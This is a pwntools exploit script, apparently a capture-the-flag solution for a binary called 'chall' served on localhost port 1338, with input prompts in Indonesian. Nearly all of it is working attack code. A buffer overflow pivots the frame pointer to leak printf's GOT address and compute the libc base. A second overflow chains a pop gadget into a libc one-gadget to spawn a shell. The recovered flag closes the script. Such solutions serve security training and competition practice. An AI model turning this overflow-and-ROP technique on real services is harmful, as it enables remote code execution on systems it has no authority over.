from pwn import *

elf = ELF('./chall', checksec=False)
libc = ELF('./libc6_2.27-3ubuntu1.5_amd64.so', checksec=False)
# p = elf.process()
p = remote('127.0.0.1', 1338)
# Name
p.sendlineafter(b': ', b'A'*8)
# Tanggal
p.sendlineafter(b':', b'B'*8)
# Alamat
p.sendlineafter(b':', b'C'*0x30 + 
                      # rbp -> rbp-0x40 -> &buff
                      p64(elf.got['printf']+0x40) + 
                      # leak fgets@got from sym.imp.printf("Welcome %s", &buff);
                      p64(0x004012ea))
# HP
p.sendafter(b':', b'D'*0xc)
# Motto Hidup
p.sendlineafter(b':', b'E'*8)

# leak
p.recvuntil(b'Welcome ')
libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym['printf']
log.info(f'libc_leak             @ 0x{libc_leak:x}')
log.info(f'libc base             @ 0x{libc.address:x}')

# Tanggal
p.sendlineafter(b':', b'B'*8)
# Alamat
p.sendlineafter(b':', b'C'*0x38 + 
                      # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
                      p64(0x0000000000401384) + 
                      p64(0)*4 + 
                      # one gadget
                      p64(libc.address + 0x4f302))
# HP
p.sendafter(b':', b'D'*0xc)
# Motto Hidup
p.sendlineafter(b':', b'E'*8)
p.interactive()
# hacklabs{F1nd_B4s3_LIBC_4ND_r3Turn_SySt3m}